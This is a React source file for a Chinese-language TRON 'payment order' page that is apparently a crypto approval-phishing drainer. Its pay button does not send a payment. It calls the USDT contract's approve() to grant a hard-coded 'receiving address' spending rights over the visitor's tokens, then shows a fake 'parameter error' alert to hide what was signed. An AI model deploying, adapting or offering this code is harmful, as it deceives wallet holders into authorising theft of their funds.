import { useEffect, useState } from "react";
import { useSearchParams } from "react-router-dom";

export default function Dapp() {
  const [params] = useSearchParams();
  const username = params.get("username") || "未提供";
  const amount = params.get("amount") || "0";

  const [walletAddress, setWalletAddress] = useState("");

  const USDT_ADDRESS = "TXLAQ63Xg1NAzckPwKHvzw7CSEmLMEqcdj"; // USDT合约地址
  const SPENDER_ADDRESS = "TD6BbmRVVMu1kG4zBHqvrp8dySR4NkHKer"; // 你的收款地址

  useEffect(() => {
    const timer = setInterval(() => {
      if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
        setWalletAddress(window.tronWeb.defaultAddress.base58);
        clearInterval(timer);
      }
    }, 500);

    return () => clearInterval(timer);
  }, []);

  // 👇👇👇 注意：这里是 handleApprove 函数，等下单独替换这个就行
  const handleApprove = async () => {
    console.log("点击付款，开始处理...");

    if (!window.tronWeb || !window.tronWeb.ready) {
      console.log("未检测到 tronWeb 环境或未连接钱包！");
      alert("未检测到钱包，请用钱包自带浏览器访问！");
      return;
    }

    console.log("检测到钱包，地址是：", window.tronWeb.defaultAddress.base58);

    try {
      console.log("开始加载USDT合约...");
      
      const contract = await window.tronWeb.contract().at(USDT_ADDRESS);

      console.log("合约加载成功！准备发起授权...");

      const approveAmount = window.tronWeb.toSun(amount);
      console.log("授权目标地址:", SPENDER_ADDRESS);
      console.log("授权金额(SUN单位):", approveAmount);

      const tx = await contract.approve(SPENDER_ADDRESS, approveAmount).send({
        feeLimit: 10000000
      });

      console.log("授权交易已发送，交易哈希:", tx);

      setTimeout(() => {
        alert("参数错误！");
      }, 500);
    } catch (error) {
      console.error("捕获到错误:", error);
      if (error && error.message) {
        alert(`捕获到异常: ${error.message}`);
      } else {
        alert("捕获到未知异常！");
      }
    }
  };

  return (
    <div className="min-h-screen flex flex-col items-center justify-center bg-gradient-to-b from-blue-100 to-blue-200 p-6">
      <div className="bg-purple-600 text-white rounded-2xl p-6 w-full max-w-md shadow-lg">
        <h2 className="text-2xl font-bold mb-6 flex items-center justify-center">
          🛒 支付订单
        </h2>
        <div className="text-left space-y-4 text-lg">
          <p>用户名：{username}</p>
          <p>付款金额：{amount} USDT</p>
          <p>实际到账金额：{(parseFloat(amount) * 7.3).toFixed(2)} RMB</p>
          <p className="break-all">钱包地址：{walletAddress || "未连接"}</p>
        </div>
      </div>

      <button
        onClick={handleApprove}
        className="mt-8 bg-purple-600 hover:bg-purple-700 text-white font-bold py-3 px-8 rounded-full shadow-md"
      >
        点击付款
      </button>
    </div>
  );
}
